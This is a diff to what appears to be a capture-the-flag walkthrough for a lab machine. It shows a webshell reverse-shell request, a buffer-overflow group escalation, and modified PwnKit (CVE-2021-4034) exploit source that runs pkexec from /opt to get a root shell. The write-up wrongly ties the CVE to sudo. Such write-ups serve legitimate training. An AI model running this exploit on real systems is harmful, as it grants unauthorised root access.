@@ -212,4 +212,97 @@ grab the session cookie: PHPSESSID=t8gbu5ql720ib9l0ke9di9h9lp
 
             $curl http://webportal.engineer.htb/admin/uploads/vuln.php?x={ur bash reverse shell here}
             
-7. 
+7. there's a binary "www-data_into_cybercraze_group" in /home/cybercraze
+
+            www-data@engineer:~/webportal/admin/uploads$ ls /home/cybercraze
+            user.txt  www-data_into_cybercraze_group
+            www-data@engineer:~/webportal/admin/uploads$ /home/cybercraze/www-data_into_cybercraze_group 
+
+             Enter the password : 
+            abcd
+
+             Wrong Password
+             
+*as the name suggest, this binary adds www-data into cybercraze group but it requests for a password. Attempting to input a long string proves that it is vulnerable to buffer overflow:
+
+            www-data@engineer:~/webportal/admin/uploads$ id
+            uid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)
+            www-data@engineer:~/webportal/admin/uploads$ /home/cybercraze/www-data_into_cybercraze_group
+
+             Enter the password : 
+            hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
+
+             Wrong Password 
+
+             Including user www-data to cybercraze group 
+            [sudo] password for www-data:
+            Segmentation fault (core dumped)
+
+after closing and getting another new shell we observe that the group for www-data change:
+
+            www-data@engineer:/home/cybercraze$ id
+            uid=33(www-data) gid=1001(cybercraze) groups=1001(cybercraze),27(sudo)
+            
+8. running linpeas scan will reveal the following info:
+
+*the sudo version is vulnerable to cve-2021-4034
+
+*/opt is readable by cybercraze group members
+
+*refer to https://github.com/berdav/CVE-2021-4034
+
+by reading some documentation of the exploit we know that it relies on the binary /usr/bin/pkexec which is given the suid permission
+
+however, the binary pkexec is moved from path /usr/bin to /opt
+
+some manual editing of the exploits have to be done:
+
+            $ git clone https://github.com/berdav/CVE-2021-4034.git
+            $ cd CVE-2021-4034
+            $ls
+            convert.sh       cve-2021-4034.sh  LICENSE   pwnkit.c   vuln-setup.sh
+            cve-2021-4034.c  dry-run           Makefile  README.md
+            $ nano cve-2021-4034.c --> change the path of /usr/bin/pkexec to /opt/pkexec as follow:
+                        #include <unistd.h>
+
+                        int main(int argc, char **argv)
+                        {
+                                char * const args[] = {
+                                        NULL
+                                };
+                                char * const environ[] = {
+                                        "pwnkit.so:.",
+                                        "PATH=GCONV_PATH=.",
+                                        "SHELL=/lol/i/do/not/exists",
+                                        "CHARSET=PWNKIT",
+                                        "GIO_USE_VFS=",
+                                        NULL
+                                };
+                                return execve("/opt/pkexec", args, environ);
+                        }
+            $ nano pwnkit.c --> add /opt into the path variable as follow:
+                        #include <stdio.h>
+                        #include <stdlib.h>
+                        #include <unistd.h>
+
+                        void gconv(void) {
+                        }
+
+                        void gconv_init(void *step)
+                        {
+                                char * const args[] = { "/bin/sh", NULL };
+                                char * const environ[] = { "PATH=/opt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr>
+                                setuid(0);
+                                setgid(0);
+                                execve(args[0], args, environ);
+                                exit(0);
+                        }
+            $make
+            cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
+            cc -Wall    cve-2021-4034.c   -o cve-2021-4034
+            echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
+            mkdir -p GCONV_PATH=.
+            cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
+            
+now the exploit is manually configured. Zip the whole directory and transfer to the target machine
+
